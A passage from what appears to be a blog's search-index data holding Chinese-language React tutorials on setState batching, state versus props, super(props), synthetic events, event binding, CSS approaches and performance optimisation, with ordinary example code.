所有队列中的更新\n而在原生事件和异步操作中，不会执行pre钩子，或者生命周期的中的异步操作之前执行了pre钩子，但是pos钩子也在异步操作之前执行完了，isBatchingUpdates必定为false，也就不会进行批量更新\n\n\n\nenqueueUpdate包含了React避免重复render的逻辑。mountComponent和updateComponent方法在执行的最开始，会调用到batchedUpdates进行批处理更新，此时会将isBatchingUpdates设置为true，也就是将状态标记为现在正处于更新阶段了。 isBatchingUpdates为 true，则把当前组件（即调用了 setState 的组件）放入dirtyComponents数组中；否则 batchUpdate 所有队列中的更新\n\n1.2 为什么直接修改this.state无效\n要知道setState本质是通过一个队列机制实现state更新的。 执行setState时，会将需要更新的state合并后放入状态队列，而不会立刻更新state，队列机制可以批量更新state。\n如果不通过setState而直接修改this.state，那么这个state不会放入状态队列中，下次调用setState时对状态队列进行合并时，会忽略之前直接被修改的state，这样我们就无法合并了，而且实际也没有把你想要的state更新上去\n\n1.3 什么是批量更新 Batch Update\n在一些mv*框架中，，就是将一段时间内对model的修改批量更新到view的机制。比如那前端比较火的React、vue（nextTick机制,视图的更新以及实现）\n\n1.4 setState之后发生的事情\nsetState操作并不保证是同步的，也可以认为是异步的\nReact在setState之后，会经对state进行diff，判断是否有改变，然后去diff dom决定是否要更新UI。如果这一系列过程立刻发生在每一个setState之后，就可能会有性能问题\n在短时间内频繁setState。React会将state的改变压入栈中，在合适的时机，批量更新state和视图，达到提高性能的效果\n\n1.5 如何知道state已经被更新\n传入回调函数\n\nsetState(&#123;    index: 1&#125;&#125;, function()&#123;    console.log(this.state.index);&#125;)\n\n\n在钩子函数中体现\n\ncomponentDidUpdate()&#123;    console.log(this.state.index);&#125;\n\n1.6 如何知道state已经被更新二、setState循环调用风险\n当调用setState时，实际上会执行enqueueSetState方法，并对partialState以及_pending-StateQueue更新队列进行合并操作，最终通过enqueueUpdate执行state更新\n而performUpdateIfNecessary方法会获取_pendingElement,_pendingStateQueue，_pending-ForceUpdate，并调用receiveComponent和updateComponent方法进行组件更新\n如果在shouldComponentUpdate或者componentWillUpdate方法中调用setState，此时this._pending-StateQueue != null，就会造成循环调用，使得浏览器内存占满后崩溃\n\n三、事务\n事务就是将需要执行的方法使用wrapper封装起来，再通过事务提供的perform方法执行，先执行wrapper中的initialize方法，执行完perform之后，在执行所有的close方法，一组initialize及close方法称为一个wrapper。\n那么事务和setState方法的不同表现有什么关系，首先我们把4次setState简单归类，前两次属于一类，因为它们在同一调用栈中执行，setTimeout中的两次setState属于另一类\n在setState调用之前，已经处在batchedUpdates执行的事务中了。那么这次batchedUpdates方法是谁调用的呢，原来是ReactMount.js中的_renderNewRootComponent方法。也就是说，整个将React组件渲染到DOM中的过程就是处于一个大的事务中。而在componentDidMount中调用setState时，batchingStrategy的isBatchingUpdates已经被设为了true，所以两次setState的结果没有立即生效\n再反观setTimeout中的两次setState，因为没有前置的batchedUpdates调用，所以导致了新的state马上生效\n\n四、总结\n通过setState去更新this.state，不要直接操作this.state，请把它当成不可变的\n调用setState更新this.state不是马上生效的，它是异步的，所以不要天真以为执行完setState后this.state就是最新的值了\n多个顺序执行的setState不是同步地一个一个执行滴，会一个一个加入队列，然后最后一起执行，即批处理\n\n","categories":["原理","React"],"tags":["React"]},{"title":"React-state 和 props 的区别","url":"/2020/03/19/React/React-state%20%E5%92%8C%20props%20%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、state一个组件的显示形态可以由数据状态和外部参数所决定，而数据状态就是 state，一般在 constructor中初始化\n当需要修改里面的值的状态需要通过调用 setState 来改变，从而达到更新组件内部数据的作用，并且重新调用组件 render 方法，如下面的例子：\nclass Button extends React.Component &#123;  constructor() &#123;    super();    this.state = &#123;      count: 0,    &#125;;  &#125;  updateCount() &#123;    this.setState((prevState, props) =&gt; &#123;      return &#123; count: prevState.count + 1 &#125;;    &#125;);  &#125;  render() &#123;    return (      &lt;button onClick=&#123;() =&gt; this.updateCount()&#125;&gt;        Clicked &#123;this.state.count&#125; times      &lt;/button&gt;    );  &#125;&#125;\n\nsetState 还可以接受第二个参数，它是一个函数，会在 setState 调用完成并且组件开始重新渲染时被调用，可以用来监听渲染是否完成\nthis.setState(  &#123;    name: &quot;JS每日一题&quot;,  &#125;,  () =&gt; console.log(&quot;setState finished&quot;));\n\n二、propsReact 的核心思想就是组件化思想，页面会被切分成一些独立的、可复用的组件\n组件从概念上看就是一个函数，可以接受一个参数作为输入值，这个参数就是 props，所以可以把 props 理解为从外部传入组件内部的数据\nreact 具有单向数据流的特性，所以他的主要作用是从父组件向子组件中传递数据\nprops 除了可以传字符串，数字，还可以传递对象，数组甚至是回调函数，如下：\nclass Welcome extends React.Component &#123;  render() &#123;    return &lt;h1&gt;Hello &#123;this.props.name&#125;&lt;/h1&gt;;  &#125;&#125;const element = &lt;Welcome name=&quot;Sara&quot; onNameChanged=&#123;this.handleName&#125; /&gt;;\n\n上述 name 属性与 onNameChanged 方法都能在子组件的 props 变量中访问\n在子组件中，props 在内部不可变的，如果想要改变它看，只能通过外部组件传入新的 props 来重新渲染子组件，否则子组件的 props 和展示形式不会改变\n三、区别相同点：\n\n两者都是 JavaScript 对象\n两者都是用于保存信息\nprops 和 state 都能触发渲染更新\n\n区别：\n\nprops 是外部传递给组件的，而 state 是在组件内被组件自己管理的，一般在 constructor 中初始化\nprops 在组件内部是不可修改的，但 state 在组件内部可以进行修改\nstate 是多变的、可以修改\n\n","categories":["框架"],"tags":["React"]},{"title":"React-super() 和 super(props)的区别","url":"/2020/03/23/React/React-super()%20%E5%92%8C%20super(props)%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、ES6 类在 ES6 中，通过 extends 关键字实现类的继承，方式如下：\nclass sup &#123;  constructor(name) &#123;    this.name = name;  &#125;  printName() &#123;    console.log(this.name);  &#125;&#125;class sub extends sup &#123;  constructor(name, age) &#123;    super(name); // super代表的事父类的构造函数    this.age = age;  &#125;  printAge() &#123;    console.log(this.age);  &#125;&#125;let jack = new sub(&quot;jack&quot;, 20);jack.printName(); //输出 : jackjack.printAge(); //输出 : 20\n\n在上面的例子中，可以看到通过 super 关键字实现调用父类，super 代替的是父类的构建函数，使用 super(name) 相当于调用 sup.prototype.constructor.call(this,name)\n如果在子类中不使用 super，关键字，则会引发报错，如下：\n\n报错的原因是 子类是没有自己的 this 对象的，它只能继承父类的 this 对象，然后对其进行加工\n而 super() 就是将父类中的 this 对象继承给子类的，没有 super() 子类就得不到 this 对象\n如果先调用 this，再初始化 super()，同样是禁止的行为\nclass sub extends sup &#123;  constructor(name, age) &#123;    this.age = age;    super(name); // super代表的事父类的构造函数  &#125;&#125;\n\n所以在子类 constructor 中，必须先代用 super 才能引用 this\n二、类组件在 React 中，类组件是基于 ES6 的规范实现的，继承 React.Component，因此如果用到 constructor 就必须写 super() 才初始化 this\n这时候，在调用 super() 的时候，我们一般都需要传入 props 作为参数，如果不传进去，React 内部也会将其定义在组件实例中\n// React 内部const instance = new YourComponent(props);instance.props = props;\n\n所以无论有没有 constructor，在 render 中 this.props 都是可以使用的，这是 React 自动附带的，是可以不写的：\nclass HelloMessage extends React.Component &#123;  render() &#123;    return &lt;div&gt;nice to meet you! &#123;this.props.name&#125;&lt;/div&gt;;  &#125;&#125;\n\n，调用 this.props 为 undefined，如下情况：\nclass Button extends React.Component &#123;  constructor(props) &#123;    super(); // 没传入 props    console.log(props);      //  &#123;&#125;    console.log(this.props); //  undefined    // ...  &#125;&#125;\n\n\n\n而传入 props 的则都能正常访问，确保了 this.props 在构造函数执行完毕之前已被赋值，更符合逻辑，如下：\nclass Button extends React.Component &#123;  constructor(props) &#123;    super(props); // 没传入 props    console.log(props);      //  &#123;&#125;    console.log(this.props); //  &#123;&#125;    // ...  &#125;&#125;\n\n总结在 React 中，类组件基于 ES6，所以在 constructor 中必须使用 super\n在调用 super 过程，无论是否传入 props，React 内部都会将 porps 赋值给组件实例 porps 属性中\n如果只调用了 super()，那么 this.props 在 super() 和构造函数结束之间仍是 undefined\n","categories":["框架"],"tags":["React"]},{"title":"React-事件机制","url":"/2020/02/17/React/React-%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6/","content":"一、是什么React基于浏览器的事件机制自身实现了一套事件机制，包括事件注册、事件的合成、事件冒泡、事件派发等\n在React中这套事件机制被称之为合成事件\n合成事件（SyntheticEvent）合成事件是 React模拟原生 DOM事件所有能力的一个事件对象，即浏览器原生事件的跨浏览器包装器\n根据 W3C规范来定义合成事件，兼容所有浏览器，拥有与浏览器原生事件相同的接口，例如：\nconst button = &lt;button onClick=&#123;handleClick&#125;&gt;按钮&lt;/button&gt;\n\n如果想要获得原生DOM事件，可以通过e.nativeEvent属性获取\nconst handleClick = (e) =&gt; console.log(e.nativeEvent);;const button = &lt;button onClick=&#123;handleClick&#125;&gt;按钮&lt;/button&gt;\n\n从上面可以看到React事件和原生事件也非常的相似，但也有一定的区别：\n\n事件名称命名方式不同\n\n// 原生事件绑定方式&lt;button onclick=&quot;handleClick()&quot;&gt;按钮命名&lt;/button&gt;      // React 合成事件绑定方式const button = &lt;button onClick=&#123;handleClick&#125;&gt;按钮命名&lt;/button&gt;\n\n\n事件处理函数书写不同\n\n// 原生事件 事件处理函数写法&lt;button onclick=&quot;handleClick()&quot;&gt;按钮命名&lt;/button&gt;      // React 合成事件 事件处理函数写法const button = &lt;button onClick=&#123;handleClick&#125;&gt;按钮命名&lt;/button&gt;\n\n虽然onclick看似绑定到DOM元素上，但实际并不会把事件代理函数直接绑定到真实的节点上，而是把所有的事件绑定到结构的最外层，使用一个统一的事件去监听\n这个事件监听器上维持了一个映射来保存所有组件内部的事件监听和处理函数。当组件挂载或卸载时，只是在这个统一的事件监听器上插入或删除一些对象\n当事件发生时，首先被这个统一的事件监听器处理，然后在映射里找到真正的事件处理函数并调用。这样做简化了事件处理和回收机制，效率也有很大提升\n二、执行顺序关于React合成事件与原生事件执行顺序，可以看看下面一个例子：\nimport  React  from &#x27;react&#x27;;class App extends React.Component&#123;  constructor(props) &#123;    super(props);    this.parentRef = React.createRef();    this.childRef = React.createRef();  &#125;  componentDidMount() &#123;    console.log(&quot;React componentDidMount！&quot;);    this.parentRef.current?.addEventListener(&quot;click&quot;, () =&gt; &#123;      console.log(&quot;原生事件：父元素 DOM 事件监听！&quot;);    &#125;);    this.childRef.current?.addEventListener(&quot;click&quot;, () =&gt; &#123;      console.log(&quot;原生事件：子元素 DOM 事件监听！&quot;);    &#125;);    document.addEventListener(&quot;click&quot;, (e) =&gt; &#123;      console.log(&quot;原生事件：document DOM 事件监听！&quot;);    &#125;);  &#125;  parentClickFun = () =&gt; &#123;    console.log(&quot;React 事件：父元素事件监听！&quot;);  &#125;;  childClickFun = () =&gt; &#123;    console.log(&quot;React 事件：子元素事件监听！&quot;);  &#125;;  render() &#123;    return (      &lt;div ref=&#123;this.parentRef&#125; onClick=&#123;this.parentClickFun&#125;&gt;        &lt;div ref=&#123;this.childRef&#125; onClick=&#123;this.childClickFun&#125;&gt;          分析事件执行顺序        &lt;/div&gt;      &lt;/div&gt;    );  &#125;&#125;export default App;\n\n输出顺序为：\n原生事件：子元素 DOM 事件监听！ 原生事件：父元素 DOM 事件监听！ React 事件：子元素事件监听！ React 事件：父元素事件监听！ 原生事件：document DOM 事件监听！ \n\n可以得出以下结论：\n\nReact 所有事件都挂载在 document 对象上\n当真实 DOM 元素触发事件，会冒泡到 document 对象后，再处理 React 事件\n所以会先执行原生事件，然后处理 React 事件\n最后真正执行 document 上挂载的事件\n\n对应过程如图所示：\n\n所以想要阻止不同时间段的冒泡行为，对应使用不同的方法，对应如下：\n\n阻止合成事件间的冒泡，用e.stopPropagation()\n阻止合成事件与最外层 document 上的事件间的冒泡，用e.nativeEvent.stopImmediatePropagation()\n阻止合成事件与除最外层document上的原生事件上的冒泡，通过判断e.target来避免\n\ndocument.body.addEventListener(&#x27;click&#x27;, e =&gt; &#123;       if (e.target &amp;&amp; e.target.matches(&#x27;div.code&#x27;)) &#123;          return;        &#125;        this.setState(&#123;   active: false,    &#125;);   &#125;); &#125;\n\n三、总结React事件机制总结如下：\n\nReact 上注册的事件最终会绑定在document这个 DOM 上，而不是 React 组件对应的 DOM(减少内存开销就是因为所有的事件都绑定在 document 上，其他节点没有绑定事件)\nReact 自身实现了一套事件冒泡机制，所以这也就是为什么我们 event.stopPropagation()无效的原因。\nReact 通过队列的形式，从触发的组件向父组件回溯，然后调用他们 JSX 中定义的 callback\nReact 有一套自己的合成事件 SyntheticEvent\n\n","categories":["框架"],"tags":["React"]},{"title":"React-事件绑定方式","url":"/2020/04/13/React/React-%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A%E6%96%B9%E5%BC%8F/","content":"一、是什么在react应用中，事件名都是用小驼峰格式进行书写，例如onclick要改写成onClick\n最简单的事件绑定如下：\nclass ShowAlert extends React.Component &#123;  showAlert() &#123;    console.log(&quot;Hi&quot;);  &#125;  render() &#123;    return &lt;button onClick=&#123;this.showAlert&#125;&gt;show&lt;/button&gt;;  &#125;&#125;\n\n从上面可以看到，事件绑定的方法需要使用&#123;&#125;包住\n上述的代码看似没有问题，但是当将处理函数输出代码换成console.log(this)的时候，点击按钮，则会发现控制台输出undefined\n二、如何绑定为了解决上面正确输出this的问题，常见的绑定方式有如下：\n\nrender方法中使用bind\nrender方法中使用箭头函数\nconstructor中bind\n定义阶段使用箭头函数绑定\n\nrender方法中使用bind如果使用一个类组件，在其中给某个组件&#x2F;元素一个onClick属性，它现在并会自定绑定其this到当前组件，解决这个问题的方法是在事件函数后使用.bind(this)将this绑定到当前组件中\nclass App extends React.Component &#123;  handleClick() &#123;    console.log(&#x27;this &gt; &#x27;, this);  &#125;  render() &#123;    return (      &lt;div onClick=&#123;this.handleClick.bind(this)&#125;&gt;test&lt;/div&gt;    )  &#125;&#125;\n\n这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能\nrender方法中使用箭头函数通过ES6的上下文来将this的指向绑定给当前组件，同样再每一次render的时候都会生成新的方法，影响性能\nclass App extends React.Component &#123;  handleClick() &#123;    console.log(&#x27;this &gt; &#x27;, this);  &#125;  render() &#123;    return (      &lt;div onClick=&#123;e =&gt; this.handleClick(e)&#125;&gt;test&lt;/div&gt;    )  &#125;&#125;\n\nconstructor中bind在constructor中预先bind当前组件，可以避免在render操作中重复绑定\nclass App extends React.Component &#123;  constructor(props) &#123;    super(props);    this.handleClick = this.handleClick.bind(this);  &#125;  handleClick() &#123;    console.log(&#x27;this &gt; &#x27;, this);  &#125;  render() &#123;    return (      &lt;div onClick=&#123;this.handleClick&#125;&gt;test&lt;/div&gt;    )  &#125;&#125;\n\n定义阶段使用箭头函数绑定跟上述方式三一样，能够避免在render操作中重复绑定，实现也非常的简单，如下：\nclass App extends React.Component &#123;  constructor(props) &#123;    super(props);  &#125;  handleClick = () =&gt; &#123;    console.log(&#x27;this &gt; &#x27;, this);  &#125;  render() &#123;    return (      &lt;div onClick=&#123;this.handleClick&#125;&gt;test&lt;/div&gt;    )  &#125;&#125;\n\n三、区别上述四种方法的方式，区别主要如下：\n\n编写方面：方式一、方式二写法简单，方式三的编写过于冗杂\n性能方面：方式一和方式二在每次组件render的时候都会生成新的方法实例，性能问题欠缺。若该函数作为属性值传给子组件的时候，都会导致额外的渲染。而方式三、方式四只会生成一个方法实例\n\n综合上述，方式四是最优的事件绑定方式\n","categories":["框架"],"tags":["React"]},{"title":"React引入css","url":"/2019/12/16/React/React-%E5%BC%95%E5%85%A5css/","content":"一、是什么组件式开发选择合适的css解决方案尤为重要\n通常会遵循以下规则：\n\n可以编写局部css，不会随意污染其他组件内的原生；\n可以编写动态的css，可以获取当前组件的一些状态，根据状态的变化生成不同的css样式；\n支持所有的css特性：伪类、动画、媒体查询等；\n编写起来简洁方便、最好符合一贯的css风格特点\n\n在这一方面，vue使用css起来更为简洁：\n\n通过 style 标签编写样式\nscoped 属性决定编写的样式是否局部有效\nlang 属性设置预处理器\n内联样式风格的方式来根据最新状态设置和改变css\n\n而在react中，引入CSS就不如Vue方便简洁，其引入css的方式有很多种，各有利弊\n二、方式常见的CSS引入方式有以下：\n\n在组件内直接使用\n组件中引入 .css 文件\n组件中引入 .module.css 文件\nCSS in JS\n\n在组件内直接使用直接在组件中书写css样式，通过style属性直接引入，如下：\nimport React, &#123; Component &#125; from &quot;react&quot;;const div1 = &#123;  width: &quot;300px&quot;,  margin: &quot;30px auto&quot;,  backgroundColor: &quot;#44014C&quot;,  //驼峰法  minHeight: &quot;200px&quot;,  boxSizing: &quot;border-box&quot;&#125;;class Test extends Component &#123;  constructor(props, context) &#123;    super(props);  &#125;   render() &#123;    return (     &lt;div&gt;       &lt;div style=&#123;div1&#125;&gt;123&lt;/div&gt;       &lt;div style=&#123;&#123;backgroundColor:&quot;red&quot;&#125;&#125;&gt;     &lt;/div&gt;    );  &#125;&#125;export default Test;\n\n上面可以看到，css属性需要转换成驼峰写法\n这种方式优点：\n\n内联样式, 样式之间不会有冲突\n可以动态获取当前state中的状态\n\n缺点：\n\n写法上都需要使用驼峰标识\n某些样式没有提示\n大量的样式, 代码混乱\n某些样式无法编写(比如伪类&#x2F;伪元素)\n\n组件中引入css文件将css单独写在一个css文件中，然后在组件中直接引入\nApp.css文件：\n.title &#123;  color: red;  font-size: 20px;&#125;.desc &#123;  color: green;  text-decoration: underline;&#125;\n\n组件中引入：\nimport React, &#123; PureComponent &#125; from &#x27;react&#x27;;import Home from &#x27;./Home&#x27;;import &#x27;./App.css&#x27;;export default class App extends PureComponent &#123;  render() &#123;    return (      &lt;div className=&quot;app&quot;&gt;        &lt;h2 className=&quot;title&quot;&gt;我是App的标题&lt;/h2&gt;        &lt;p className=&quot;desc&quot;&gt;我是App中的一段文字描述&lt;/p &gt;        &lt;Home/&gt;      &lt;/div&gt;    )  &#125;&#125;\n\n这种方式存在不好的地方在于样式是全局生效，样式之间会互相影响\n组件中引入 .module.css 文件将css文件作为一个模块引入，这个模块中的所有css，只作用于当前组件。不会影响当前组件的后代组件\n这种方式是webpack特工的方案，只需要配置webpack配置文件中modules:true即可\nimport React, &#123; PureComponent &#125; from &#x27;react&#x27;;import Home from &#x27;./Home&#x27;;import &#x27;./App.module.css&#x27;;export default class App extends PureComponent &#123;  render() &#123;    return (      &lt;div className=&quot;app&quot;&gt;        &lt;h2 className=&quot;title&quot;&gt;我是App的标题&lt;/h2&gt;        &lt;p className=&quot;desc&quot;&gt;我是App中的一段文字描述&lt;/p &gt;        &lt;Home/&gt;      &lt;/div&gt;    )  &#125;&#125;\n\n这种方式能够解决局部作用域问题，但也有一定的缺陷：\n\n引用的类名，不能使用连接符(.xxx-xx)，在 JavaScript 中是不识别的\n所有的 className 都必须使用 {style.className} 的形式来编写\n不方便动态来修改某些样式，依然需要使用内联样式的方式；\n\nCSS in JSCSS-in-JS， 是指一种模式，其中CSS由 JavaScript生成而不是在外部文件中定义\n此功能并不是 React 的一部分，而是由第三方库提供，例如：\n\nstyled-components\nemotion\nglamorous\n\n下面主要看看styled-components的基本使用\n本质是通过函数的调用，最终创建出一个组件：\n\n这个组件会被自动添加上一个不重复的class\nstyled-components会给该class添加相关的样式\n\n基本使用如下：\n创建一个style.js文件用于存放样式组件：\nexport const SelfLink = styled.div`  height: 50px;  border: 1px solid red;  color: yellow;`;export const SelfButton = styled.div`  height: 150px;  width: 150px;  color: $&#123;props =&gt; props.color&#125;;  background-image: url($&#123;props =&gt; props.src&#125;);  background-size: 150px 150px;`;\n\n引入样式组件也很简单：\nimport React, &#123; Component &#125; from &quot;react&quot;;import &#123; SelfLink, SelfButton &#125; from &quot;./style&quot;;class Test extends Component &#123;  constructor(props, context) &#123;    super(props);  &#125;     render() &#123;    return (     &lt;div&gt;       &lt;SelfLink title=&quot;People&#x27;s Republic of China&quot;&gt;app.js&lt;/SelfLink&gt;       &lt;SelfButton color=&quot;palevioletred&quot; style=&#123;&#123; color: &quot;pink&quot; &#125;&#125; src=&#123;fist&#125;&gt;          SelfButton        &lt;/SelfButton&gt;     &lt;/div&gt;    );  &#125;&#125;export default Test;\n\n三、区别通过上面四种样式的引入，可以看到：\n\n在组件内直接使用css该方式编写方便，容易能够根据状态修改样式属性，但是大量的演示编写容易导致代码混乱\n组件中引入 .css 文件符合我们日常的编写习惯，但是作用域是全局的，样式之间会层叠\n引入.module.css 文件能够解决局部作用域问题，但是不方便动态修改样式，需要使用内联的方式进行样式的编写\n通过css in js 这种方法，可以满足大部分场景的应用，可以类似于预处理器一样样式嵌套、定义、修改状态等\n\n至于使用react用哪种方案引入css，并没有一个绝对的答案，可以根据各自情况选择合适的方案\n","categories":["框架"],"tags":["React"]},{"title":"React性能优化","url":"/2020/04/20/React/React-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","content":"一、重新认识render\nreact的组件渲染分为初始化渲染和更新渲染\n\n\n在初始化渲染的时候会调用根组件下的所有组件的render方法进行渲染，如下图（绿色表示已渲染，这一层是没有问题的）\n\n\n但是当我们要更新某个子组件的时候，如下图的绿色组件（从根组件传递下来应用在绿色组件上的数据发生改变）\n\n我们的理想状态是只调用关键路径上组件的render\n\n但是react的默认做法是调用所有组件的render，再对生成的虚拟DOM进行对比，如不变则不进行更新。这样的render和虚拟DOM的 对比 明显是在浪费，如下图（黄色表示浪费的render和虚拟DOM对比）\n\nTips\n\n拆分组件是有利于复用和组件优化的\n生成虚拟DOM并进行比对发生在render()后，而不是render()前\n\n二、更新阶段的生命周期\ncomponentWillReceiveProps(object nextProps) ：当挂载的组件接收到新的props时被调用。此方法应该被用于比较this.props 和 nextProps以用于使用this.setState()执行状态转换。（组件内部数据有变化，使用state，但是在更新阶段又要在props改变的时候改变state，则在这个生命周期里面）\nshouldComponentUpdate(object nextProps, object nextState) ： -boolean 当组件决定任何改变是否要更新到DOM时被调用。作为一个 优化 实现比较this.props 和 nextProps 、this.state 和 nextState ，如果React应该跳过更新，返回false\ncomponentWillUpdate(object nextProps, object nextState) ：在更新发生前被立即调用。你不能在此调用 this.setState()\ncomponentDidUpdate(object prevProps, object prevState) ： 在更新发生后被立即调用。（可以在DOM更新完之后，做一些收尾的工作）\n\nTips\n\nReact的优化是基于 shouldComponentUpdate 的，该生命周期默认返回true，所以一旦prop或state有任何变化，都会引起重新render\n\n三、shouldComponentUpdate\nreact在每个组件生命周期更新的时候都会调用一个shouldComponentUpdate(nextProps, nextState)函数。它的职责就是返回true或false，true表示需要更新，false表示不需要，默认返回为true，即便你没有显示地定义 shouldComponentUpdate 函数。这就不难解释上面发生的资源浪费了\n\n带坑的写法\n\n&#123;...this.props&#125; (不要滥用，请只传递component需要的props，传得太多，或者层次传得太深，都会加重shouldComponentUpdate里面的数据比较负担，因此，也请慎用spread attributes（）)\n::this.handleChange()。(请将方法的bind一律置于constructor)\n复杂的页面不要在一个组件里面写完\n请尽量使用const element\nmap里面添加key，并且key不要使用index（可变的)\n尽量少用setTimeOut或不可控的refs、DOM操作\n数据尽可能简单明了，扁平化\n\n四、性能检测工具React.addons.Perf\n\nreact官方提供一个插件 React.addons.Perf 可以帮助我们分析组件的性能，以确定是否需要优化\n\nreact16以前需要在项目中配置，react16以后请看这篇文章，直接打开控制台的perf选项测试 https://reactjs.org/docs/optimizing-performance.html#profiling-components-with-the-chrome-performance-tab\nreact16之前配置\n\n安装 react 性能检测工具 npm i react-addons-perf --save，然后在./app/index.js中\n\n// 性能测试import Perf from &#x27;react-addons-perf&#x27;if (__DEV__) &#123;    window.Perf = Perf&#125;\n\n\n打开console面板，先输入 Perf.start() 执行一些组件操作，引起数据变动，组件更新，然后输入 Perf.stop() 。（建议一次只执行一个操作，好进行分析）\n再输入 Perf.printInclusive 查看所有涉及到的组件render，如下图（官方图片）\n\n\n\n或者输入Perf.printWasted()查看下不需要的的浪费组件render\n\n\n优化前\n\n优化后\n\n五、其他优化1、前端通用优化。这类优化在所有前端框架中都存在，重点就在于如何将这些技巧应用在 React 组件中。\n2、减少不必要的组件更新。这类优化是在组件状态发生变更后，通过减少不必要的组件更新来实现，对应到 React 中就是：减少渲染的节点 、降低组件渲染的复杂度、充分利用缓存避免重新渲染（利用缓存可以考虑使用PureComponent、React.memo、hook函数useCallback、useMemo等方法）\n\nPureComponent 是对类组件的 Props 和 State 进行浅比较；React.memo 是对函数组件的 Props 进行浅比较\n\n3、提交阶段优化。这类优化的目的是减少提交阶段耗时。\n1、组件按需加载组件按需加载优化又可以分为：懒加载、懒渲染、虚拟列表 三类。\n懒加载\n在 SPA 中，懒加载优化一般用于从一个路由跳转到另一个路由。还可用于用户操作后才展示的复杂组件，比如点击按钮后展示的弹窗模块。在这些场景下，可以结合 Code Split 实现。\n懒加载的实现主要是通过 Webpack 的动态导入和 React.lazy 方法。注意，实现懒加载优化时，不仅要考虑加载态，还需要对加载失败进行容错处理。\nimport &#123; lazy, Suspense, Component &#125; from &quot;react&quot;import &quot;./styles.css&quot;// 对加载失败进行容错处理class ErrorBoundary extends Component &#123;  constructor(props) &#123;    super(props)    this.state = &#123; hasError: false &#125;  &#125;  static getDerivedStateFromError(error) &#123;    return &#123; hasError: true &#125;  &#125;  render() &#123;    if (this.state.hasError) &#123;      return &lt;h1&gt;这里处理出错场景&lt;/h1&gt;    &#125;    return this.props.children  &#125;&#125;const Comp = lazy(() =&gt; &#123;  return new Promise((resolve, reject) =&gt; &#123;    setTimeout(() =&gt; &#123;      if (Math.random() &gt; 0.5) &#123;        reject(new Error(&quot;模拟网络出错&quot;))      &#125; else &#123;        resolve(import(&quot;./Component&quot;))      &#125;    &#125;, 2000)  &#125;)&#125;)export default function App() &#123;  return (    &lt;div className=&quot;App&quot;&gt;      &lt;div style=&#123;&#123; marginBottom: 20 &#125;&#125;&gt;        实现懒加载优化时，不仅要考虑加载态，还需要对加载失败进行容错处理。      &lt;/div&gt;      &lt;ErrorBoundary&gt;        &lt;Suspense fallback=&quot;Loading...&quot;&gt;          &lt;Comp /&gt;        &lt;/Suspense&gt;      &lt;/ErrorBoundary&gt;    &lt;/div&gt;  )&#125;\n\n懒渲染\n懒渲染指当组件进入或即将进入可视区域时才渲染组件。常见的组件 Modal&#x2F;Drawer 等，当 visible 属性为 true 时才渲染组件内容，也可以认为是懒渲染的一种实现。\n懒渲染的使用场景有：\n\n页面中出现多次的组件，且组件渲染费时、或者组件中含有接口请求。如果渲染多个带有请求的组件，由于浏览器限制了同域名下并发请求的数量，就可能会阻塞可见区域内的其他组件中的请求，导致可见区域的内容被延迟展示。\n需用户操作后才展示的组件。这点和懒加载一样，但懒渲染不用动态加载模块，不用考虑加载态和加载失败的兜底处理，实现上更简单。\n\n判断组件是否出现在可视区域内是通过 react-visibility-observer 进行监听。\nimport &#123; useState, useEffect &#125; from &quot;react&quot;import VisibilityObserver, &#123;  useVisibilityObserver,&#125; from &quot;react-visibility-observer&quot;const VisibilityObserverChildren = (&#123; callback, children &#125;) =&gt; &#123;  const &#123; isVisible &#125; = useVisibilityObserver()  useEffect(() =&gt; &#123;    callback(isVisible)  &#125;, [callback, isVisible])  return &lt;&gt;&#123;children&#125;&lt;/&gt;&#125;export const LazyRender = () =&gt; &#123;  const [isRendered, setIsRendered] = useState(false)  if (!isRendered) &#123;    return (      &lt;VisibilityObserver rootMargin=&#123;&quot;0px 0px 0px 0px&quot;&#125;&gt;        &lt;VisibilityObserverChildren          callback=&#123;isVisible =&gt; &#123;            if (isVisible) &#123;              setIsRendered(true)            &#125;          &#125;&#125;        &gt;          &lt;span /&gt;        &lt;/VisibilityObserverChildren&gt;      &lt;/VisibilityObserver&gt;    )  &#125;  console.log(&quot;滚动到可视区域才渲染&quot;)  return &lt;div&gt;我是 LazyRender 组件&lt;/div&gt;&#125;export default LazyRender\n\n虚拟列表\n虚拟列表是懒渲染的一种特殊场景。实现虚拟列表的组件有 react-window 和 react-virtualized。react-window 是 react-virtualized 的轻量版本，其 API 和文档更加友好。新项目中推荐使用 react-window。\n使用 react-window 很简单，只需要计算每项的高度即可。如果每项的高度是变化的，可给 itemSize 参数传一个函数。\nimport &#123; FixedSizeList as List &#125; from &quot;react-window&quot;const Row = (&#123; index, style &#125;) =&gt; &lt;div style=&#123;style&#125;&gt;Row &#123;index&#125;&lt;/div&gt;const Example = () =&gt; (  &lt;List    height=&#123;150&#125;    itemCount=&#123;1000&#125;    itemSize=&#123;35&#125; // 每项的高度为 35    width=&#123;300&#125;  &gt;    &#123;Row&#125;  &lt;/List&gt;)\n\n2、批量更新3、利用防抖、节流 避免重复回调4、缓存优化缓存优化往往是最简单有效的优化方式，在 React 组件中常用 useMemo 缓存上次计算的结果。当 useMemo 的依赖未发生改变时，就不会触发重新计算。一般用在「计算派生状态的代码」非常耗时的场景中，如：遍历大列表做统计信息。\n\nReact 官方并不保证 useMemo 一定会进行缓存，所以可能在依赖不改变时，仍然执行重新计算。参考 How to memoize calculations\nuseMemo 只能缓存最近一次函数执行的结果，如果想缓存更多次函数执行的结果，可使用 memoizee。\n\n5、列表项使用 key 属性","categories":["框架"],"tags":["React"]},{"title":"React-提高组件效率  避免不必要的render","url":"/2020/01/18/React/React-%E6%8F%90%E9%AB%98%E7%BB%84%E4%BB%B6%E6%95%88%E7%8E%87%20%20%E9%81%BF%E5%85%8D%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84render/","content":"一、是什么react 基于虚拟 DOM 和高效 Diff算法的完美配合，实现了对 DOM最小粒度的更新，大多数情况下，React对 DOM的渲染效率足以我们的业务日常\n复杂业务场景下，性能问题依然会困扰我们。此时需要采取一些措施来提升运行性能，避免不必要的渲染则是业务中常见的优化手段之一\n二、如何做在之前文章中，我们了解到render的触发时机，简单来讲就是类组件通过调用setState方法， 